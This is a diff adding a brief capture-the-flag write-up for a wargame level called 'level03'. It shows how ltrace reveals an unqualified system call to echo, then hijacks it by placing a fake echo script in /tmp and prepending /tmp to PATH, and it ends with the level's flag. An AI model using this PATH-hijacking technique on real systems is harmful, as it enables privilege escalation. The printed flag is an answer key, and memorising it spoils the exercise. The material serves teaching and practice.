@@ -1,0 +1,13 @@
+level03 file is  a binary file.
+Use ltrace to see the lib called during it is executed
+You can see that the echo function is called by system and not well protected
+
+Then go in /tmp to have more freedom
+Create a script so you can call the getflag function
+# vim tmp/echo/ and add /bin/getflag
+Then make sure you have the right to execute 
+# chmod +x /tmp/echo
+Then fake the echo call with an absolute path
+# PATH="/tmp:$PATH" ./level03
+
+Flag :qi0maab88jeaj46qoumi7maus
